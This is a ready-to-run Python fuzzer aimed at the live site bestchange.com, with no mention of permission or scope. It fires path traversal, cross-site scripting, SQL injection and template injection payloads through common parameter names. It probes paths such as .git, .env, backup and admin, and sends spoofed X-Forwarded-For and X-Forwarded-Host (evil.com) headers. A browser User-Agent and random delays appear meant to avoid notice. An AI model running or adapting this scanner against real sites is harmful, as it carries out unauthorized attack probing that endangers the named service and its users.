#!/usr/bin/env python3
"""
BestChange.com Comprehensive Fuzzer
Systematic fuzzing of endpoints and parameters
"""

import requests
import time
import random
import itertools
from urllib.parse import urljoin

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

class ComprehensiveFuzzer:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.session.timeout = 8
    
    def random_delay(self, min_sec=0.1, max_sec=0.4):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        self.findings.append({
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity
        })
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    {location}: {details}\n")
    
    def fuzz_parameters(self):
        """Fuzz common parameter names"""
        print(f"{Colors.BLUE}[*] Fuzzing parameter names...{Colors.RESET}")
        
        common_params = [
            'id', 'user', 'user_id', 'username', 'email', 'password',
            'file', 'path', 'page', 'dir', 'directory', 'include',
            'redirect', 'url', 'link', 'goto', 'return', 'return_url',
            'cmd', 'command', 'exec', 'execute', 'action',
            'search', 'query', 'q', 'filter', 'sort',
            'limit', 'offset', 'page', 'per_page',
            'callback', 'jsonp', 'format',
        ]
        
        fuzz_values = [
            '../', '..\\', '....//',
            '<script>alert(1)</script>',
            "1' OR '1'='1",
            '${7*7}',
            '{{7*7}}',
        ]
        
        endpoints = [
            f'{self.base_url}/index.php',
            f'{self.base_url}/click.php',
        ]
        
        for endpoint in endpoints:
            for param in common_params[:10]:  # Limit to save time
                for value in fuzz_values[:3]:
                    try:
                        response = self.session.get(endpoint, params={param: value}, timeout=5)
                        self.random_delay()
                        
                        # Check for reflection
                        if value in response.text or value.replace("'", "&#39;") in response.text:
                            self.log_finding(
                                "Parameter Reflection",
                                f"{endpoint}?{param}",
                                f"Value reflected: {value[:50]}",
                                "MEDIUM"
                            )
                    except:
                        continue
    
    def fuzz_paths(self):
        """Fuzz URL paths"""
        print(f"{Colors.BLUE}[*] Fuzzing URL paths...{Colors.RESET}")
        
        path_fuzz = [
            '../', '..\\', '....//',
            '%2e%2e%2f', '%2e%2e%5c',
            'admin', 'administrator', 'panel', 'dashboard',
            'api', 'rest', 'v1', 'v2',
            'test', 'dev', 'staging',
            'backup', 'backups', 'old',
            '.git', '.svn', '.env',
        ]
        
        base_paths = ['/', '/index.php', '/click.php']
        
        for base_path in base_paths:
            for fuzz in path_fuzz[:10]:
                try:
                    url = urljoin(self.base_url, base_path + fuzz)
                    response = self.session.get(url, timeout=5)
                    self.random_delay()
                    
                    if response.status_code in [200, 301, 302, 403]:
                        if fuzz in response.text or 'admin' in response.text.lower():
                            self.log_finding(
                                "Path Fuzzing Result",
                                url,
                                f"Status: {response.status_code}",
                                "INFO"
                            )
                except:
                    continue
    
    def fuzz_headers(self):
        """Fuzz HTTP headers"""
        print(f"{Colors.BLUE}[*] Fuzzing HTTP headers...{Colors.RESET}")
        
        header_tests = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Host': 'evil.com'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
        ]
        
        for headers in header_tests:
            try:
                response = self.session.get(f"{self.base_url}/", headers=headers, timeout=5)
                self.random_delay()
                
                # Check if header value is reflected
                for header_name, header_value in headers.items():
                    if header_value in response.text:
                        self.log_finding(
                            "Header Injection",
                            "HTTP Headers",
                            f"{header_name} reflected: {header_value}",
                            "MEDIUM"
                        )
            except:
                continue
    
    def generate_report(self):
        """Generate report"""
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}COMPREHENSIVE FUZZER REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        if self.findings:
            print(f"{Colors.RED}[!] Found {len(self.findings)} finding(s){Colors.RESET}\n")
            for finding in self.findings:
                color = Colors.RED if finding['severity'] == 'HIGH' else Colors.YELLOW
                print(f"{color}[{finding['severity']}] {finding['type']}{Colors.RESET}")
                print(f"    {finding['location']}: {finding['details']}\n")
        else:
            print(f"{Colors.GREEN}[+] No vulnerabilities found in fuzzing{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Comprehensive Fuzzer{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    fuzzer = ComprehensiveFuzzer()
    
    try:
        fuzzer.fuzz_parameters()
        fuzzer.fuzz_paths()
        fuzzer.fuzz_headers()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.RESET}")
    
    fuzzer.generate_report()

if __name__ == "__main__":
    main()
